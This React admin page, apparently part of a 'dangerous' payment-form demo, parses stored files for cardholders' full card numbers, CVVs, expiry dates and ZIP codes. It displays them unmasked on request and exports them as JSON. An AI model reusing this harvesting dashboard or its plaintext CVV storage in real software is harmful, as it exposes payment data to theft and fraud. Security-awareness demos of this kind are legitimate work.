import React, { useState, useEffect } from 'react';
import { Database, Download, Trash2, Eye, EyeOff, AlertTriangle, Users } from 'lucide-react';
import { fileStorage } from '../utils/fileStorage'; // Import the file storage utility

interface PaymentData {
  fullName: string;
  cardNumber: string;
  expiryMonth: string;
  expiryYear: string;
  cvv: string;
  zipCode: string;
  cardType: 'credit' | 'debit';
  timestamp: string;
  transactionId: string; // Add transaction ID for uniqueness
}

// Regex utility to extract data from the file content
const extractDataFromFileContent = (content: string, filename: string): PaymentData | null => {
  const data: Partial<PaymentData> = {};
  
  // Regex patterns to capture data based on fileStorage.ts content structure
  const patterns = {
    transactionId: /Transaction ID:\s*(TXN_\d+)/,
    fullName: /Full Name:\s*(.*)/,
    cardType: /Card Type:\s*(.*)/,
    cardNumber: /Card Number:\s*(.*)/,
    expiry: /Expiry Date:\s*(\d{2})\/(\d{4})/,
    cvv: /CVV Security Code:\s*(.*)/,
    zipCode: /ZIP Code:\s*(.*)/,
    timestamp: /Created:\s*(.*)/,
  };

  const lines = content.split('\n');
  
  for (const line of lines) {
    if (patterns.fullName.test(line)) {
      data.fullName = line.match(patterns.fullName)?.[1]?.trim() || '';
    } else if (patterns.cardType.test(line)) {
      // Clean up the card type string
      const rawCardType = line.match(patterns.cardType)?.[1]?.trim() || '';
      data.cardType = rawCardType.toLowerCase() as 'credit' | 'debit';
    } else if (patterns.cardNumber.test(line)) {
      data.cardNumber = line.match(patterns.cardNumber)?.[1]?.trim() || '';
    } else if (patterns.expiry.test(line)) {
      const match = line.match(patterns.expiry);
      if (match) {
        data.expiryMonth = match[1].trim();
        data.expiryYear = match[2].trim();
      }
    } else if (patterns.cvv.test(line)) {
      data.cvv = line.match(patterns.cvv)?.[1]?.trim() || '';
    } else if (patterns.zipCode.test(line)) {
      data.zipCode = line.match(patterns.zipCode)?.[1]?.trim() || '';
    } else if (patterns.timestamp.test(line)) {
      data.timestamp = line.match(patterns.timestamp)?.[1]?.trim() || '';
    } else if (patterns.transactionId.test(line)) {
      data.transactionId = line.match(patterns.transactionId)?.[1]?.trim() || '';
    }
  }

  // Simple validation to ensure critical fields are present
  if (data.fullName && data.cardNumber && data.cvv && data.expiryMonth && data.expiryYear && data.zipCode) {
    // The timestamp in the file content is the record timestamp
    return data as PaymentData;
  }

  // console.warn(`Failed to parse file: ${filename}. Content:`, content);
  return null;
};


const AdminPage: React.FC = () => {
  const [paymentData, setPaymentData] = useState<PaymentData[]>([]);
  const [showCardNumbers, setShowCardNumbers] = useState(false);
  const [selectedRecord, setSelectedRecord] = useState<PaymentData | null>(null);

  useEffect(() => {
    loadPaymentData();
  }, []);

  const loadPaymentData = () => {
    const files = fileStorage.getDatasFolderContents();
    const loadedData: PaymentData[] = [];

    files.forEach(filename => {
      // Only process files that are clearly the dangerous demo files
      if (filename.includes('_DANGEROUS.txt')) {
        const content = fileStorage.getFileContent(filename);
        if (content) {
          const record = extractDataFromFileContent(content, filename);
          if (record) {
            loadedData.push(record);
          }
        }
      }
    });

    setPaymentData(loadedData.reverse()); // Reverse to show latest first
    setSelectedRecord(null);
  };

  const clearAllData = () => {
    if (confirm('Are you sure you want to clear all collected demo data (files)?')) {
      fileStorage.clearAllFiles();
      setPaymentData([]);
      setSelectedRecord(null);
    }
  };

  const exportData = () => {
    // Export the currently loaded structured data
    const dataStr = JSON.stringify(paymentData, null, 2);
    const dataUri = 'data:application/json;charset=utf-8,'+ encodeURIComponent(dataStr);
    
    const exportFileDefaultName = `payment_demo_data_extracted_${new Date().toISOString().split('T')[0]}.json`;
    
    const linkElement = document.createElement('a');
    linkElement.setAttribute('href', dataUri);
    linkElement.setAttribute('download', exportFileDefaultName);
    linkElement.click();
  };

  const maskCardNumber = (cardNumber: string) => {
    const cleaned = cardNumber.replace(/\s/g, '');
    return cleaned.replace(/(\d{4})(\d{4})(\d{4})(\d{4})/, '••••-••••-••••-$4');
  };

  const getCardType = (cardNumber: string) => {
    const number = cardNumber.replace(/\s/g, '');
    if (number.startsWith('4')) return 'Visa';
    if (number.startsWith('5')) return 'Mastercard';
    if (number.startsWith('3')) return 'American Express';
    return 'Unknown';
  };

  return (
    <div className="min-h-screen bg-gray-100">
      <div className="max-w-7xl mx-auto px-4 py-8">
        {/* Header */}
        <div className="bg-white rounded-lg shadow-lg p-6 mb-8">
          <div className="flex items-center justify-between">
            <div className="flex items-center">
              <Database className="w-8 h-8 text-blue-600 mr-3" />
              <div>
                <h1 className="text-2xl font-bold text-gray-900">
                  🔐 Admin
                </h1>
                <p className="text-gray-600">
                  Dashboard (Reading from fileStorage.ts)
                </p>
              </div>
            </div>
            <div className="flex items-center space-x-2">
              <Users className="w-5 h-5 text-gray-500" />
              <span className="text-lg font-semibold text-gray-700">
                {paymentData.length} Records
              </span>
            </div>
          </div>
        </div>

        {/* Controls */}
        <div className="bg-white rounded-lg shadow-lg p-6 mb-6">
          <div className="flex flex-wrap gap-4 items-center justify-between">
            <div className="flex items-center space-x-4">
              <button
                onClick={() => setShowCardNumbers(!showCardNumbers)}
                className="flex items-center px-4 py-2 bg-gray-600 text-white rounded-lg hover:bg-gray-700 transition-colors"
              >
                {showCardNumbers ? <EyeOff className="w-4 h-4 mr-2" /> : <Eye className="w-4 h-4 mr-2" />}
                {showCardNumbers ? 'Hide' : 'Show'} Card Numbers
              </button>
              
              <button
                onClick={exportData}
                disabled={paymentData.length === 0}
                className="flex items-center px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
              >
                <Download className="w-4 h-4 mr-2" />
                Export Data
              </button>

              <button
                onClick={loadPaymentData}
                className="flex items-center px-4 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 transition-colors"
              >
                <Database className="w-4 h-4 mr-2" />
                Reload Data
              </button>
            </div>

            <button
              onClick={clearAllData}
              disabled={paymentData.length === 0}
              className="flex items-center px-4 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
            >
              <Trash2 className="w-4 h-4 mr-2" />
              Clear All Data (Files)
            </button>
          </div>
        </div>

        {/* Data Table */}
        <div className="bg-white rounded-lg shadow-lg overflow-hidden">
          {paymentData.length === 0 ? (
            <div className="p-12 text-center">
              <Database className="w-16 h-16 text-gray-300 mx-auto mb-4" />
              <h3 className="text-xl font-semibold text-gray-500 mb-2">No Data Collected Yet</h3>
              <p className="text-gray-400">
                Payment information will appear here when users complete the demo form
              </p>
              <a
                href="/"
                className="inline-block mt-4 px-6 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors"
                onClick={() => window.location.hash = ''}
              >
                Go to Payment Demo
              </a>
            </div>
          ) : (
            <>
              <div className="px-6 py-4 bg-gray-50 border-b">
                <h3 className="text-lg font-semibold text-gray-900">
                  Collected Payment Information
                </h3>
                <p className="text-sm text-gray-600 mt-1">
                  Click on any record to view detailed information
                </p>
              </div>

              <div className="overflow-x-auto">
                <table className="w-full">
                  <thead className="bg-gray-50 border-b">
                    <tr>
                      <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                        Timestamp
                      </th>
                      <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                        Name
                      </th>
                      <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                        Card Number
                      </th>
                      <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                        Card Type
                      </th>
                      <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                        Expiry
                      </th>
                      <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                        ZIP
                      </th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-gray-200">
                    {paymentData.map((record, index) => (
                      <tr
                        key={record.transactionId} // Use transactionId as key
                        onClick={() => setSelectedRecord(record)}
                        className="hover:bg-gray-50 cursor-pointer transition-colors"
                      >
                        <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-900">
                          {new Date(record.timestamp).toLocaleString()}
                        </td>
                        <td className="px-6 py-4 whitespace-nowrap text-sm font-medium text-gray-900">
                          {record.fullName}
                        </td>
                        <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-900 font-mono">
                          {showCardNumbers ? record.cardNumber : maskCardNumber(record.cardNumber)}
                        </td>
                        <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-900">
                          <span className="flex items-center">
                            <span className="capitalize mr-2">{record.cardType}</span>
                            <span className="text-xs bg-gray-100 px-2 py-1 rounded">
                              {getCardType(record.cardNumber)}
                            </span>
                          </span>
                        </td>
                        <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-900">
                          {record.expiryMonth}/{record.expiryYear}
                        </td>
                        <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-900">
                          {record.zipCode}
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </>
          )}
        </div>

        {/* Detailed View Modal (Unchanged) */}
        {selectedRecord && (
          <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
            <div className="bg-white rounded-lg max-w-md w-full p-6">
              <div className="flex justify-between items-center mb-4">
                <h3 className="text-lg font-semibold text-gray-900">Payment Record Details</h3>
                <button
                  onClick={() => setSelectedRecord(null)}
                  className="text-gray-400 hover:text-gray-600"
                >
                  ✕
                </button>
              </div>

              <div className="space-y-4">
                <div>
                  <label className="block text-sm font-medium text-gray-700">Timestamp</label>
                  <p className="text-sm text-gray-900">{new Date(selectedRecord.timestamp).toLocaleString()}</p>
                </div>
                
                <div>
                  <label className="block text-sm font-medium text-gray-700">Full Name</label>
                  <p className="text-sm text-gray-900">{selectedRecord.fullName}</p>
                </div>
                
                <div>
                  <label className="block text-sm font-medium text-gray-700">Card Number</label>
                  <p className="text-sm text-gray-900 font-mono">
                    {showCardNumbers ? selectedRecord.cardNumber : maskCardNumber(selectedRecord.cardNumber)}
                  </p>
                </div>
                
                <div className="grid grid-cols-2 gap-4">
                  <div>
                    <label className="block text-sm font-medium text-gray-700">Card Type</label>
                    <p className="text-sm text-gray-900 capitalize">{selectedRecord.cardType}</p>
                  </div>
                  <div>
                    <label className="block text-sm font-medium text-gray-700">Brand</label>
                    <p className="text-sm text-gray-900">{getCardType(selectedRecord.cardNumber)}</p>
                  </div>
                </div>
                
                <div className="grid grid-cols-3 gap-4">
                  <div>
                    <label className="block text-sm font-medium text-gray-700">Expiry Month</label>
                    <p className="text-sm text-gray-900">{selectedRecord.expiryMonth}</p>
                  </div>
                  <div>
                    <label className="block text-sm font-medium text-gray-700">Expiry Year</label>
                    <p className="text-sm text-gray-900">{selectedRecord.expiryYear}</p>
                  </div>
                  <div>
                    <label className="block text-sm font-medium text-gray-700">CVV</label>
                    <p className="text-sm text-gray-900 font-mono">
                      {showCardNumbers ? selectedRecord.cvv : '•••'}
                    </p>
                  </div>
                </div>
                
                <div>
                  <label className="block text-sm font-medium text-gray-700">ZIP Code</label>
                  <p className="text-sm text-gray-900">{selectedRecord.zipCode}</p>
                </div>
              </div>

              <div className="mt-6 pt-4 border-t">
                <button
                  onClick={() => setSelectedRecord(null)}
                  className="w-full px-4 py-2 bg-gray-600 text-white rounded-lg hover:bg-gray-700 transition-colors"
                >
                  Close
                </button>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

export default AdminPage;
